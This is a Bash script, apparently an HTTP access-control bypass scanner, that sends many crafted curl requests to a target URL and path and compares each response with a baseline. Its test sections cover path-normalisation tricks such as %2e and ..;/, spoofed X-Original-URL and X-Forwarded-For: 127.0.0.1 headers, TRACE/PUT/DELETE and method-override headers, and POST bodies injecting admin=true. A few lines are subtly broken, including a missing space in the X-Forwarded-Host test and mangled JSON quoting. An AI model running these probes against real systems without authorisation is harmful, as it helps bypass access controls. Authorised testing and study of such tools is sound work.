#!/usr/bin/env bash
set -euo pipefail

# --- CONFIGURATION & COLORS ---
RED='\u001B[0;31m'
GREEN='\u001B[0;32m'
YELLOW='\u001B[0;33m'
BLUE='\u001B[0;34m'
CYAN='\u001B[0;36m'
MAGENTA='\u001B[0;35m'
NC='\u001B[0m' # No Color

# --- HELPER FUNCTIONS ---

usage() {
    echo -e "${RED}Usage: $0 <URL> <PATH>${NC}"
    echo -e "${YELLOW}Example: $0 https://example.com admin${NC}"
    exit 1
}

require_curl() {
    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Error: curl is required but not installed.${NC}"
        exit 1
    fi
}

# Basic sanity checks for arguments (very simple allowlist)
validate_args() {
    local url="$1"
    local path="$2"

    # Very loose URL check: must start with http:// or https://
    if [[ ! "$url" =~ ^https?:// ]]; then
        echo -e "${RED}Error: URL must start with http:// or https://${NC}"
        exit 1
    fi

    # PATH should not be empty and must not contain spaces
    if [[ -z "$path" || "$path" =~ [[:space:]] ]]; then
        echo -e "${RED}Error: PATH must be non-empty and contain no spaces.${NC}"
        exit 1
    fi
}

# Print one formatted row
print_result() {
    local code="$1"
    local size="$2"
    local time_total="$3"
    local desc="$4"
    local note="${5:-}"

    local c_code
    if [[ "$code" =~ ^2 ]]; then
        c_code="${GREEN}${code}${NC}"
    elif [[ "$code" =~ ^3 ]]; then
        c_code="${YELLOW}${code}${NC}"
    elif [[ "$code" =~ ^4 ]]; then
        c_code="${RED}${code}${NC}"
    else
        c_code="${CYAN}${code:-ERR}${NC}"
    fi

    printf "%-16s %-10s %-10s %-40s %-10s
" \
        "$c_code" "$size" "$time_total" "$desc" "$note"
}

# Run a single test:
#   run_test "Description" curl-args...
run_test() {
    local desc="$1"
    shift

    # Default values in case curl fails
    local code="ERR"
    local size="0"
    local time_total="0"

    # Capture curl output; if curl fails, keep ERR
    local output
    if output=$(curl -sS -o /dev/null -w "%{http_code}::%{size_download}::%{time_total}" "$@" 2>/dev/null); then
        code="${output%%::*}"
        local rest="${output#*::}"
        size="${rest%%::*}"
        time_total="${rest##*::}"
    fi

    # Compare to baseline if available
    local note=""
    if [[ -n "${BASE_CODE:-}" && -n "${BASE_SIZE:-}" ]]; then
        if [[ "$code" != "$BASE_CODE" ]]; then
            note="${MAGENTA}CODE!=BASE${NC}"
        elif [[ "$size" != "$BASE_SIZE" ]]; then
            note="${MAGENTA}SIZE!=BASE${NC}"
        fi
    fi

    print_result "$code" "$size" "$time_total" "$desc" "$note"
}

# --- MAIN ---

if [[ "$#" -ne 2 ]]; then
    usage
fi

require_curl
validate_args "$1" "$2"

DOMAIN="${1%/}"
PATH_DIR="${2#/}"

echo -e "${BLUE}Targeting: ${DOMAIN}/${PATH_DIR}${NC}
"

printf "%-16s %-10s %-10s %-40s %-10s
" "CODE" "SIZE" "TIME(s)" "PAYLOAD" "NOTE"
echo "----------------------------------------------------------------------------------------"

# Baseline request (GET)
BASE_OUTPUT=$(curl -sS -o /dev/null -w "%{http_code}::%{size_download}" -L "${DOMAIN}/${PATH_DIR}" 2>/dev/null || echo "ERR::0")
BASE_CODE="${BASE_OUTPUT%%::*}"
BASE_SIZE="${BASE_OUTPUT##*::}"
print_result "$BASE_CODE" "$BASE_SIZE" "0" "Baseline GET" ""

echo "----------------------------------------------------------------------------------------"
echo -e "${BLUE}1. URL & PATH MANIPULATION${NC}"

run_test "URL Encoded dot /%2e/"      -L "${DOMAIN}/%2e/${PATH_DIR}"
run_test "Trailing Dot /."            -L "${DOMAIN}/${PATH_DIR}/."
run_test "Double Slashes //"          -L "${DOMAIN}//${PATH_DIR}//"
run_test "Current Dir /./"            -L "${DOMAIN}/./${PATH_DIR}/./"
run_test "%20 (Space)"                -L "${DOMAIN}/${PATH_DIR}%20"
run_test "%09 (Tab)"                  -L "${DOMAIN}/${PATH_DIR}%09"
run_test "Trailing ?"                 -L "${DOMAIN}/${PATH_DIR}?"
run_test "Add .json"                  -L "${DOMAIN}/${PATH_DIR}.json"
run_test "Semicolon ;/"               -L "${DOMAIN}/${PATH_DIR};/"
run_test "Tomcat ..;/"                -L "${DOMAIN}/${PATH_DIR}..;/"
run_test "Query: ?admin=true"         -L "${DOMAIN}/${PATH_DIR}?admin=true"
run_test "Query: ?../"                -L "${DOMAIN}/${PATH_DIR}?../"
run_test "Duplicate param id=1&id=2"  -L "${DOMAIN}/${PATH_DIR}?id=1&id=2"

echo "----------------------------------------------------------------------------------------"
echo -e "${BLUE}2. HEADER SPOOFING${NC}"

run_test "X-Original-URL"             -L -H "X-Original-URL: /${PATH_DIR}" "${DOMAIN}/"
run_test "X-Rewrite-URL"              -L -H "X-Rewrite-URL: /${PATH_DIR}" "${DOMAIN}/"
run_test "X-Forwarded-For: 127.0.0.1" -L -H "X-Forwarded-For: 127.0.0.1" "${DOMAIN}/${PATH_DIR}"
run_test "X-Real-IP: 127.0.0.1"       -L -H "X-Real-IP: 127.0.0.1" "${DOMAIN}/${PATH_DIR}"
run_test "X-Custom-IP-Authorization"  -L -H "X-Custom-IP-Authorization: 127.0.0.1" "${DOMAIN}/${PATH_DIR}"
run_test "Forwarded: for=127.0.0.1"   -L -H "Forwarded: for=127.0.0.1" "${DOMAIN}/${PATH_DIR}"
run_test "X-Forwarded-Host: localhost"-L -H "X-Forwarded-Host: localhost" "${DOMAIN}/${PATH_DIR}"

echo "----------------------------------------------------------------------------------------"
echo -e "${BLUE}3. METHOD & OVERRIDE${NC}"

run_test "Method: OPTIONS"            -L -X OPTIONS "${DOMAIN}/${PATH_DIR}"
run_test "Method: TRACE"              -L -X TRACE "${DOMAIN}/${PATH_DIR}"
run_test "Method: PUT (empty)"        -L -X PUT "${DOMAIN}/${PATH_DIR}"
run_test "Method: DELETE"             -L -X DELETE "${DOMAIN}/${PATH_DIR}"
run_test "X-HTTP-Method-Override: PUT"\
                                      -L -H "X-HTTP-Method-Override: PUT" "${DOMAIN}/${PATH_DIR}"
run_test "X-HTTP-Method-Override: DELETE"\
                                      -L -H "X-HTTP-Method-Override: DELETE" "${DOMAIN}/${PATH_DIR}"

echo "----------------------------------------------------------------------------------------"
echo -e "${BLUE}4. BODY FUZZING (POST)${NC}"

run_test "POST + Content-Length: 0"   -L -H "Content-Length: 0" -X POST "${DOMAIN}/${PATH_DIR}"
run_test "POST + chunked"             -L -H "Transfer-Encoding: chunked" -X POST "${DOMAIN}/${PATH_DIR}"
run_test "POST JSON {"id":1}"       -L -H "Content-Type: application/json" \
                                      -X POST -d '{"id":1}' "${DOMAIN}/${PATH_DIR}"
run_test "POST admin=true"            -L -X POST -d "id=1&admin=true" "${DOMAIN}/${PATH_DIR}"
run_test "POST duplicated admin"      -L -X POST -d "admin=false&admin=true" "${DOMAIN}/${PATH_DIR}"

echo "----------------------------------------------------------------------------------------"
echo -e "${BLUE}Scan Complete.${NC}"
